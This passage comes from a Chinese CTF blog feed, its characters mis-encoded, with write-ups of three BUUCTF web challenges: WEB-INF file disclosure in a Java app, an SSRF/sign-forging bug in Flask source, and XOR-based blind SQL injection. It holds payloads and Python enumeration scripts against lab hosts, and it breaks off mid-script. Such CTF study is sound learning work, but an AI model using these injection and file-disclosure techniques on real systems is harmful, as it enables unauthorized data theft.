alt="image-20240305003141069"></p><p><strong>TCP&#x2F;IPå’ŒOSIçš„ä¸åŒä¹‹å¤„ï¼š</strong></p><p><img src="http://cdn.clown2024.cn/202407151536879.png" alt="image-20240305003538566"></p><blockquote><p>é¢å‘è¿æ¥ï¼šåˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼Œç¬¬ä¸€é˜¶æ®µå»ºç«‹è¿æ¥ï¼Œç¬¬äºŒé˜¶æ®µè¿›è¡Œæ•°æ®ä¼ è¾“ï¼Œç¬¬ä¸‰é˜¶æ®µé‡Šæ”¾è¿æ¥</p><p>æ— è¿æ¥ï¼šç›´æ¥è¿›è¡Œæ•°æ®ä¼ è¾“</p></blockquote><h1 id="5å±‚å‚è€ƒæ¨¡å‹"><a href="#5å±‚å‚è€ƒæ¨¡å‹" class="headerlink" title="5å±‚å‚è€ƒæ¨¡å‹"></a>5å±‚å‚è€ƒæ¨¡å‹</h1><p>ç»¼åˆäº†OSIå’ŒTCP&#x2F;IPçš„ä¼˜ç‚¹</p><p><img src="http://cdn.clown2024.cn/202407151536880.png" alt="image-20240305003806547"></p><p>5å±‚æ¨¡å‹çš„å°è£…å’Œè§£å°è£…è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151536881.png" alt="image-20240305003949042"></p>]]></content>
      
      
      <categories>
          
          <category> åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®¡ç½‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuåšé¢˜è®°å½•1</title>
      <link href="/2024/03/02/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%951/"/>
      <url>/2024/03/02/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%951/</url>
      
        <content type="html"><![CDATA[<h1 id="roarctf-2019easy-java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>é¢˜ç›®æ˜¯ä¸€ä¸ªç™»é™†ç•Œé¢ï¼Œè¯•äº†ä¸€ä¸‹admin&#x2F;adminæ²¡ååº”</p><p><img src="http://cdn.clown2024.cn/202407151439442.png" alt="image-20240302113439732"></p><p>ç‚¹å‡»å¸®åŠ©æ–‡æ¡£å‡ºç°ä¸€ä¸ªjavaè¯­å¥<strong>java.io.FileNotFoundException:{help.docx}</strong></p><p><img src="http://cdn.clown2024.cn/202407151439443.png" alt="image-20240302113616226"></p><p>åº”è¯¥å°±æ˜¯å•¥éƒ½æ²¡æœ‰ï¼ŒæŸ¥çœ‹æºç ä»–çš„é“¾æ¥æ˜¯è¿™æ ·çš„</p><p><img src="http://cdn.clown2024.cn/202407151439444.png" alt="image-20240302113731820"></p><p>æ²¡å•¥æ€è·¯å»çœ‹åˆ«çš„å¸ˆå‚…çš„wpï¼Œè¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªWEB-INF&#x2F;xmlçš„æ–‡ä»¶æ³„éœ²ï¼Œå› ä¸ºè¿™é¢˜çš„ç¯å¢ƒæ˜¯javaçš„webåº”ç”¨</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/darkcyan/p/17668377.html">https://www.cnblogs.com/darkcyan/p/17668377.html</a></p><p><strong>WEB-INFçŸ¥è¯†</strong></p><p>WEB-INFæ˜¯Javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ã€‚æ‰€è°“å®‰å…¨å°±æ˜¯å®¢æˆ·ç«¯æ— æ³•è®¿é—®ï¼Œåªæœ‰æœåŠ¡ç«¯å¯ä»¥è®¿é—®çš„ç›®å½•ã€‚å¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡web.xmlæ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚</p><p>è¿™æ˜¯ä¸€äº›ä¸»è¦æ•æ„Ÿç›®å½•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/WEB-INF/web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™<br>/WEB-INF/classes/ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨.jaræ–‡ä»¶ä¸­<br>/WEB-INF/lib/ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶<br>/WEB-INF/src/ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶<br>/WEB-INF/database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶<br></code></pre></td></tr></table></figure><p>ç„¶åå°±å»ä¸‹è½½é¡µé¢å»çœ‹è¿™äº›æ•æ„Ÿç›®å½•çš„å†…å®¹ï¼Œå…ˆå»çœ‹WEB-INF&#x2F;web.xml</p><p>ä¸è¿‡è¿™é‡Œçš„ä¸‹è½½é¡µé¢å¾ˆå¥‡æ€ªï¼Œgetè¯·æ±‚çš„æ—¶å€™æ˜¯ä¸‹è½½ä¸äº†çš„ï¼Œæ”¹æˆpostå°±å¯ä»¥äº†ï¼Œä¸Šé¢çš„helpæ–‡æ¡£ä¹Ÿæ˜¯</p><p><img src="http://cdn.clown2024.cn/202407151439445.png" alt="image-20240302115936170"></p><p>æ”¹æˆpostå»çœ‹ä¸€ä¸‹æ–‡ä»¶å†…å®¹</p><p><img src="http://cdn.clown2024.cn/202407151439446.png" alt="image-20240302120029103"></p><p>è¿™æ˜¯ä»åˆ«çš„å¸ˆå‚…é‚£æ‰¾æ¥çš„ç›¸å…³æ ‡ç­¾çš„ç”¨æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;servlet-class&gt;  è¿™ä¸ªå°±æ˜¯æŒ‡å‘æˆ‘ä»¬è¦æ³¨å†Œçš„servlet çš„ç±»åœ°å€, è¦å¸¦åŒ…è·¯å¾„<br><br>&lt;servlet-mapping&gt;  æ˜¯ç”¨æ¥é…ç½®æˆ‘ä»¬æ³¨å†Œçš„ç»„ä»¶çš„è®¿é—®è·¯å¾„,é‡Œé¢åŒ…æ‹¬ä¸¤ä¸ªèŠ‚ç‚¹<br>ä¸€ä¸ªæ˜¯&lt;servlet-name&gt;ï¼Œè¿™ä¸ªè¦ä¸å‰é¢å†™çš„servletä¸€è‡´<br>å¦ä¸€ä¸ªæ˜¯&lt;url-pattern&gt;ï¼Œé…ç½®è¿™ä¸ªç»„ä»¶çš„è®¿é—®è·¯å¾„<br><br>&lt;servlet-name&gt; è¿™ä¸ªæ˜¯æˆ‘ä»¬è¦æ³¨å†Œservletçš„åå­—,ä¸€èˆ¬è·ŸServletç±»åæœ‰å…³<br><br>ä¸¾ä¸ªä¾‹å­<br>&lt;servlet&gt;<br>    &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;<br>    &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;<br>&lt;/servlet&gt;<br></code></pre></td></tr></table></figure><p>ç„¶åä¸Šé¢çš„web.xmlæ–‡ä»¶æˆ‘ä»¬çœ‹åˆ°äº†flagç›¸å…³çš„ç±»ï¼Œç„¶åæœ‰ä¸ªè·¯å¾„æˆ‘è¯•ç€å»è®¿é—®äº†ä¸€ä¸‹è¿”å›500çŠ¶æ€ç ï¼Œé‚£å°±è¦å»æ‰¾FlagController.classæ–‡ä»¶äº†</p><p>å› ä¸ºWEB-INF&#x2F;classesé‡Œé¢åŒ…å«äº†æ‰€æœ‰classæ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬ä»è¯¥ç›®å½•å¼€å§‹ç„¶åé€šè¿‡åŒ…åå»å†™è·¯å¾„å³å¯æ‹¿åˆ°æƒ³è¦çš„classæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/Download<br><br>POST:<br>filename=WEB-INF/classes/com/wm/ctf/FlagController.class<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439447.png" alt="image-20240302121422866"></p><p>ç„¶åå°†å…¶ä¸­çš„base64å­—ç¬¦ä¸²æ‹¿å»è§£ç å³å¯è·å¾—flag</p><h1 id="de1ctf-2019ssrf-me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h1><p>é¢˜ç›®è¿›å»å°±çœ‹åˆ°ä¸€æ®µå¾ˆä¸‘é™‹çš„æºä»£ç ï¼Œçœ‹æºç ä¹Ÿæ²¡æœ‰æ ¼å¼åŒ–å¥½</p><p><img src="http://cdn.clown2024.cn/202407151439448.png" alt="image-20240303014938284"></p><p>ç›´æ¥å»è®©gptç»™æˆ‘ç¾åŒ–äº†ä¸€ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/env python</span><br><span class="hljs-comment"># encoding=utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br><br>app = Flask(__name__)<br>secert_key = os.urandom(<span class="hljs-number">16</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):<br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)):  <span class="hljs-comment"># SandBox For Remote_Addr</span><br>            os.mkdir(self.sandbox)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">self</span>):<br>        result = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>        <span class="hljs-keyword">if</span> (self.checkSign()):<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span> resp<br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br>            <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>            result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>        <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSign</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># generate Sign For Action Scan.</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge</span>():<br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span>(waf(param)):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan</span>(<span class="hljs-params">param</span>):<br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">content</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">param</span>):<br>    check = param.strip().lower()<br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class="hljs-literal">False</span><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br><br></code></pre></td></tr></table></figure><p>æ ¹æ®é¢˜ç›®çš„æç¤ºflagåœ¨.&#x2F;flag.txté‡Œé¢</p><p>å®¡è®¡æºç å‘ç°paramå’Œactionæ˜¯æˆ‘ä»¬å¯æ§çš„å‚æ•°ï¼Œåœ¨Execå‡½æ•°é‡Œï¼Œåœ¨é€šè¿‡checkSign()çš„æ ¡éªŒä¹‹åï¼Œå¦‚æœcookieä¸­çš„acitonåŒ…å«scanå°±å†™å…¥æ–‡ä»¶ï¼Œå¦‚æœåŒ…å«readå°±è¯»å–æ–‡ä»¶</p><p>è¿™é‡Œç”±äºwafè¿‡æ»¤äº†gopherå’Œfileï¼Œå°±ä¸èƒ½é€šè¿‡paramç›´æ¥ä¼ å‚è¯»æ–‡ä»¶ï¼Œä¸è¿‡urllib.urlopen()è¿™ä¸ªæ–¹æ³•æœ‰ä¸¤ç§æ–¹æ³•è¯»å–æœ¬åœ°æ–‡ä»¶</p><ul><li>ç›´æ¥å†™æ–‡ä»¶å</li><li>åˆ©ç”¨local_fileåè®®ï¼šè¯¥åè®®å’Œfileçš„ç”¨æ³•ä¸€æ ·ï¼Œlocal_file&#x2F;&#x2F;&#x2F;etc&#x2F;passwdï¼Œä½†æ˜¯ä¹Ÿè¢«è¿‡æ»¤äº†</li></ul><p>æ‰€ä»¥è¿™é‡Œåœ¨paramå¡«æ–‡ä»¶åå†™å…¥æ–‡ä»¶</p><p><img src="http://cdn.clown2024.cn/202407151439449.png" alt="image-20240303155134761"></p><p>ç„¶åæˆ‘ä»¬å°±è¦å†å»å°†actionæ¢æˆreadå»è¯»å–ï¼Œä¸è¿‡è¿™é‡Œç”Ÿæˆçš„signå°±éœ€è¦è‡ªå·±å»æ„é€ äº†ï¼Œå› ä¸º&#x2F;geneSignè·¯ç”±é»˜è®¤çš„actionæ˜¯scanï¼Œæˆ‘ä»¬å»çœ‹ä¸€ä¸‹getSign()å‡½æ•°</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬ä¸çŸ¥é“secret_keyï¼Œä½†æ˜¯&#x2F;geneSigné»˜è®¤actionä¸ºscanï¼Œæƒ³æŸ¥çœ‹æ–‡ä»¶åˆä¸€å®šè¦readï¼Œæ‰€ä»¥ç›´æ¥åé¢åŠ ä¸ªreadç”Ÿæˆsignå³å¯</p><p><img src="http://cdn.clown2024.cn/202407151439450.png" alt="image-20240303160239016"></p><p>ç„¶åæˆ‘ä»¬ç»™paramä¼ ä¸€ä¸ªreadsignå³å¯ï¼Œå› ä¸ºçŸ¥è¯†æ£€æµ‹æ˜¯å¦æœ‰è¯¥å…³é”®å­—</p><p><img src="http://cdn.clown2024.cn/202407151439451.png" alt="image-20240303161016765"></p><h1 id="æå®¢å¤§æŒ‘æˆ˜-2019finalsql"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL</h1><p>è¿™é¢˜è¿›å»æœ‰ä¸ªç™»é™†é¡µé¢</p><p><img src="http://cdn.clown2024.cn/202407151439452.png" alt="image-20240303201649603"></p><p>ä¸€å¼€å§‹ä»¥ä¸ºæ³¨å…¥ç‚¹åœ¨ç™»é™†çš„åœ°æ–¹ï¼Œå› ä¸ºç›´æ¥getè¯·æ±‚å‘é€ç”¨æˆ·åå’Œå¯†ç ï¼Œè¯•äº†ä¸€ä¸‹å‘ç°æ²¡æœ‰ï¼Œåæ‰å‘ç°ä¸Šé¢çš„12345ä¼šç»™urlä¼ é€’idå‚æ•°</p><p><img src="http://cdn.clown2024.cn/202407151439453.png" alt="image-20240303201828243"></p><p>idä¼ 6ä¹‹åçš„æ•°å­—ä¼šå‘ç”Ÿå˜åŒ–ï¼Œä¼ é€’æ•°å­—å’Œå­—ç¬¦ä¸²æ—¶è¿”å›çš„é¡µé¢ä¸ä¸€æ ·</p><p><img src="http://cdn.clown2024.cn/202407151439454.png" alt="image-20240303201948963"></p><p><img src="http://cdn.clown2024.cn/202407151439455.png" alt="image-20240303202000621"></p><p>å»å°è¯•äº†ä¸€äº›å­—ç¬¦å‘ç°è¢«è¿‡æ»¤äº†ä¸æƒ³fuzzï¼Œå»çœ‹wpè¯´æ˜¯^æ²¡è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨å¼‚æˆ–æ¥è¿›è¡Œç›²æ³¨ï¼Œå› ä¸ºé¢˜ç›®ä¹Ÿæœ‰æç¤ºè¯´ç›²æ³¨,å‚è€ƒæ–‡ç« ï¼š<a href="https://www.shawroot.cc/1158.html">https://www.shawroot.cc/1158.html</a></p><p>payloadçš„å¤§æ¦‚æ€è·¯å°±æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1^(sqlè¯­å¥)<br>//æ¯”å¦‚çˆ†åº“çš„è¯å¯ä»¥ç”¨æ”¹è¯­å¥ord(substr(database(),1,1)&gt;10),è¿™å°±æ˜¯åˆ¤æ–­æ•°æ®åº“ç¬¬ä¸€ä½çš„asciiç å€¼æ˜¯å¦å¤§äº10ï¼Œord()å‡½æ•°ä¹Ÿå¯ä»¥ç”¨ascii()å‡½æ•°ä»£æ›¿<br>//å¦‚æœé¡µé¢å›æ˜¾ä¸ºERROR!!!ï¼Œè¡¨ç¤ºæ­£ç¡®ï¼Œå› ä¸º1^1=0<br>//å¦‚æœé¡µé¢å›æ˜¾ä¸ºNO! Not this! Click others~~~å³id=1æ—¶çš„é¡µé¢ï¼Œåˆ™é”™è¯¯ï¼Œå› ä¸º1^0=1<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439456.png" alt="image-20240303214756062"></p><p>payloadå¦‚ä¸‹ï¼š</p><p>çˆ†å‡ºåº“åè„šæœ¬ï¼Œè¿™é‡Œç›´æ¥æŒ‰é¡ºåºçˆ†ä¸‹å»ä¸å†™äºŒåˆ†æ³•äº†</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>result=<span class="hljs-string">&quot;&quot;</span><br>url=<span class="hljs-string">&quot;http://76107f08-a9a5-443e-b4b9-1e5097f55d5e.node5.buuoj.cn:81/search.php?id=1^&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>):<br>        sql=<span class="hljs-string">&quot;(ord(substr(database(),%d,1))=%d)&quot;</span>%(i,j)<br>        response=requests.get(url=url+sql)<br>        time.sleep(<span class="hljs-number">0.02</span>)<br>        <span class="hljs-comment">#print(response.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ERROR&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            result+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439457.png" alt="image-20240303222137783"></p><p>ç„¶åå¾—å‡ºæ•°æ®åº“åä¸ºgeekï¼Œè¿™é‡Œå»¶æ—¶äº†ä¸€ç‚¹ç‚¹ï¼Œå› ä¸ºä¸çŸ¥ä¸ºä»€ä¹ˆä¼šæœ‰å‡ æ¬¡æ¼äº†ä¸€äº›å­—ç¬¦æ²¡æœ‰</p><p>ç„¶åæ”¹ä¸€æ”¹ä»£ç ç»§ç»­çˆ†è¡¨åï¼Œå‚è€ƒä¸Šé¢æ–‡ç« å¯ä»¥ç”¨è¯¥è¯­å¥å…ˆå»æµ‹è¯•ä¸€ä¸‹è¡¨åé•¿åº¦ï¼Œå¾—å‡ºé•¿åº¦ä¸º16</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1^((select(length(group_concat(TABLE_NAME)))from(information_schema.tables)where(table_schema=&quot;geek&quot;))=16)<br></code></pre></td></tr></table></figure><p>emmmåæ¥å‘ç°ä¸æ­¢ä¸¤ä¸ªè¡¨ï¼Œæˆ‘å°±ç›´æ¥å†™50ä¸ªå­—ç¬¦æ¥çˆ†äº†</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>result=<span class="hljs-string">&quot;&quot;</span><br>url=<span class="hljs-string">&quot;http://76107f08-a9a5-443e-b4b9-1e5097f55d5e.node5.buuoj.cn:81/search.php?id=1^&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>):<br>        sql=<span class="hljs-string">&quot;(ord(substr((select(group_concat(table_name))from(information_schema.columns)where(table_schema=&#x27;geek&#x27;)),%d,1))=%d)&quot;</span>%(i,j)<br>        response=requests.get(url=url+sql)<br>        time.sleep(<span class="hljs-number">0.02</span>)<br>        <span class="hljs-comment">#print(response.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ERROR&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            result+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439458.png" alt="image-20240303224502079"></p><p>ç„¶åçˆ†å‡ºä¸Šé¢å››ä¸ªè¡¨å</p><p>å†å»çˆ†ä¸€ä¸‹å­—æ®µåçœ‹çœ‹</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>result=<span class="hljs-string">&quot;&quot;</span><br>url=<span class="hljs-string">&quot;http://76107f08-a9a5-443e-b4b9-1e5097f55d5e.node5.buuoj.cn:81/search.php?id=1^&quot;</span><br>name1=<span class="hljs-string">&quot;F1naI1y&quot;</span><br>name2=<span class="hljs-string">&quot;FnaI1y,&quot;</span><br>name3=<span class="hljs-string">&quot;Fa1y&quot;</span><br>name4=<span class="hljs-string">&quot;Flaaag&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>):<br>        sql=<span class="hljs-string">&quot;(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;%s&#x27;)),%d,1))=%d)&quot;</span>%(name1,i,j)<br>        response=requests.get(url=url+sql)<br>        time.sleep(<span class="hljs-number">0.02</span>)<br>        <span class="hljs-comment">#print(response.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ERROR&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            result+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªFlaaagé‡Œé¢æ²¡æœ‰ä¸œè¥¿ï¼Œç„¶åå»çˆ†name2ï¼Œå‡ºäº†ä¸‹é¢ä¸‰ä¸ªå­—æ®µå</p><p><img src="http://cdn.clown2024.cn/202407151439459.png" alt="image-20240303225537909"></p><p>ä¸è¿‡åˆ°åé¢è¿æ¥è¶…æ—¶äº†ï¼Œä¸ç®¡äº†ä¸æƒ³çˆ†äº†()ï¼Œæ€»ä¹‹åœ¨passwordè¿™ä¸ªå­—æ®µ</p><p>ç„¶åå»çˆ†passwordå­—æ®µçš„å€¼æ‹¿flagï¼Œè¿™é‡Œç”¨æ­£åˆ™åŒ¹é…æ¥ç›´æ¥è·å–å«æœ‰flagçš„æ•°æ®æ¥çˆ†èŠ‚çœæ—¶é—´</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>result=<span class="hljs-string">&quot;&quot;</span><br>url=<span class="hljs-string">&quot;http://76107f08-a9a5-443e-b4b9-1e5097f55d5e.node5.buuoj.cn:81/search.php?id=1^&quot;</span><br>name1=<span class="hljs-string">&quot;F1naI1y&quot;</span><br>name2=<span class="hljs-string">&quot;FnaI1y,&quot;</span><br>name3=<span class="hljs-string">&quot;Fa1y&quot;</span><br>name4=<span class="hljs-string">&quot;Flaaag&quot;</span><br><span 